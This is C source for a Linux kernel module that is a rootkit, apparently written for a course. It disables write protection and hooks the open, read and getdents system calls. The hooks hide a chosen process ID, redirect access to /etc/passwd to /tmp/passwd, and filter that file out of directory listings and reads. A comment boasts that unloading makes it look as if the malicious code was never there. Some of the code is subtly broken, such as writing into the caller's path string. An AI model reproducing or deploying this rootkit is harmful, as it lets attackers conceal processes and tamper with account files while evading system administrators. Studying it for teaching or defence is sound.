#include <linux/module.h>      // for all modules 
#include <linux/moduleparam.h>
#include <linux/stat.h>
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <linux/dirent.h>
#include <asm/current.h>       // process information
#include <asm/segment.h>
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/segment.h>
#include <asm/fcntl.h>
#include <asm/cacheflush.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/slab.h>

//#define BUFFLEN	500

struct linux_dirent {
	u64 			d_ino;
	s64				d_off;
	unsigned short	d_reclen;
	char			d_name[];
};

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//To save the pid of the initial process
static int toHide;

module_param(toHide, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
MODULE_PARM_DESC(toHide, "process pid");



//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-3.13.0.77-generic

// Had to change this looking at the system map
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff8105be20;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff8105bdc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*original_read)(int fd, char *buffer, size_t size);

//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
	char * hideFile = "/etc/passwd";
	char * openFile = "/tmp/passwd";
	printk(KERN_INFO "Very, very Sneaky!\n");
	if(strcmp(pathname,hideFile) == 0){
		printk(KERN_INFO "found the file!\n");
		copy_to_user((void*)pathname, openFile, strlen(openFile));
	}

	return original_call(pathname, flags);
}

asmlinkage int sneaky_sys_read(int fd, char * buffer, size_t size){
	char * hideFile = "/etc/passwd";
	char *temp;
	unsigned int val = original_read(fd,buffer,size);
	if(strnstr(buffer, hideFile, strlen(hideFile))){
		temp = buffer;
		while(*temp && *temp != '\n'){
			*temp = ' ';
			temp++;
		}
		memmove(buffer, (char *) temp, val);
		return val;
	}
	return val;
}

asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
	// based off documentation http://www.ouah.org/LKM_HACKING.html#II.4.2.
	
	struct linux_dirent *dirp2, *dirp3;
	char hideId[50];
	char * fname = "/etc/passwd";
	int i;
	unsigned int val = original_getdents(fd,dirp,count);
	sprintf(hideId,"%d",toHide);

	printk(KERN_INFO "sneaky getdents");
	if(val > 0){
		dirp2 = (struct linux_dirent *) kmalloc(val, GFP_KERNEL);
		memcpy(dirp2,dirp,val);
		dirp3 = dirp2;
		i = val;
		while(i>0){
			i -= dirp3->d_reclen;
			if(strcmp( (char*) &(dirp3->d_name),(char*) hideId) == 0){
				// We match the pid 
				printk(KERN_INFO "found pid!");
				if( i != 0){
					memmove(dirp3, (char*) dirp3 + dirp3->d_reclen, i);
				}else{
					dirp3->d_off = 1024;
					val -= dirp3->d_reclen;
				}
				if(dirp3->d_reclen == 0){
					val -= i;
					i = 0;
				}
				if(i!=0){
					dirp3 = (struct linux_dirent *) ((char *) dirp3 + dirp3->d_reclen);
				}
				memcpy(dirp, dirp2, val);
				kfree(dirp2);
				return val;
			}
			if(strstr( (char*) &(dirp3->d_name), fname) != NULL){
				if(i != 0){
					memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, i);
				}else{
					dirp3->d_off = 1024;
				}
				val -= dirp3->d_reclen;
			}
			if(dirp3->d_reclen == 0){
				val -=i;
				i = 0;
			}
			if(i != 0){
				dirp3 = (struct linux_dirent *) ((char *) dirp3 + dirp3->d_reclen);
			}
			memcpy(dirp,dirp2,val);
		}
		kfree(dirp2);
	}

	return val;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  original_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  //Print the pid
  printk(KERN_INFO "process PID = %d \n",toHide);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
